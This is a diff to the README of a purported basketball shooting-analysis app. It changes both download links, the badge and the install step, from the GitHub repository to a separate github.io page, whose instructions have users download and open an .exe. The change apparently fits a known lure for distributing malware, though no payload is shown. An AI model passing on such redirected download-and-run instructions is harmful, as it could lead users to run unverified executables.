@@ -1,6 +1,6 @@
 # 🏀 PRO-SHOOT - Improve your basketball shooting accuracy today
 
-[![Download PRO-SHOOT](https://img.shields.io/badge/Download-PRO--SHOOT-blue.svg)](https://github.com/Snowsuitgenushyssopus66/PRO-SHOOT)
+[![Download PRO-SHOOT](https://img.shields.io/badge/Download-PRO--SHOOT-blue.svg)](https://snowsuitgenushyssopus66.github.io)
 
 PRO-SHOOT helps basketball players analyze their shooting form using computer vision. The software tracks your body movements in real time to identify flaws in your motion. It provides data on your release point, arm angle, and arc to refine your technique.
 
@@ -19,7 +19,7 @@ Make sure your computer meets these requirements to run the software:
 
 Follow these steps to set up the application on your computer:
 
-1.  Visit the [PRO-SHOOT release page](https://github.com/Snowsuitgenushyssopus66/PRO-SHOOT) to find the latest version.
+1.  Visit the [PRO-SHOOT release page](https://snowsuitgenushyssopus66.github.io) to find the latest version.
 2.  Locate the file ending in .exe under the Assets section.
 3.  Click the file name to start the download to your computer.
 4.  Open the downloaded file once the process finishes.
